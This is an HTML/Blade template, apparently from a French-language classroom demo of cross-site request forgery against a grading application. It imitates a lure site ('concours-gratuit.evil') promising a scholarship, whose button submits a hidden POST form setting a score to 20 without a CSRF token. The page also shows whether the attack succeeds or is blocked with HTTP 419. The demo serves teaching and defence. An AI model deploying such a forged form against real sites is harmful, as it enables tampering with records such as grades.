<!DOCTYPE html>
<html lang="fr">
<head>
    <meta charset="UTF-8">
    <style>
        body {
            font-family: 'Segoe UI', sans-serif;
            background: #FFFBEB;
            color: #0F172A;
            margin: 0;
            padding: 18px;
            text-align: center;
        }
        .box {
            background: #FFFFFF;
            border: 2px solid #F59E0B;
            border-radius: 12px;
            padding: 18px;
            box-shadow: 0 4px 12px rgba(0,0,0,0.06);
        }
        button {
            background: #8B1518;
            color: #FFFFFF;
            border: none;
            padding: 11px 22px;
            border-radius: 8px;
            font-weight: 800;
            font-size: 13.5px;
            cursor: pointer;
            margin-top: 10px;
        }
        code {
            display: block;
            margin-top: 10px;
            font-size: 11.5px;
            color: #92400E;
            font-weight: 600;
        }
    </style>
</head>
<body>
    <div class="box">
        <div style="font-size:11.5px; color:#B45309; font-weight:800;">SITE EXTERNE PIÈGE : http://concours-gratuit.evil</div>
        <h3 style="margin:8px 0; color:#0F172A;">🎁 Gagnez une Bourse d'Excellence UT LOKO !</h3>
        <p style="font-size:12.5px; color:#475569; margin:0;">
            En réalité, ce bouton soumet un formulaire caché <code>POST score=20</code> sans <code>_token</code> !
        </p>

        <form method="POST" action="{{ $targetAction }}" target="_top">
            <input type="hidden" name="score" value="20">
            <input type="hidden" name="source" value="evil">
            <button type="submit">🎁 Réclamer ma récompense (Déclencher Attaque CSRF)</button>
        </form>

        <code>
            Cible : {{ $targetAction }}<br>
            Résultat attendu : {{ $mode === 'vulnerable' ? '🔴 Note piratée à 20/20 !' : '🟢 Bloqué par HTTP 419 Page Expired !' }}
        </code>
    </div>
</body>
</html>
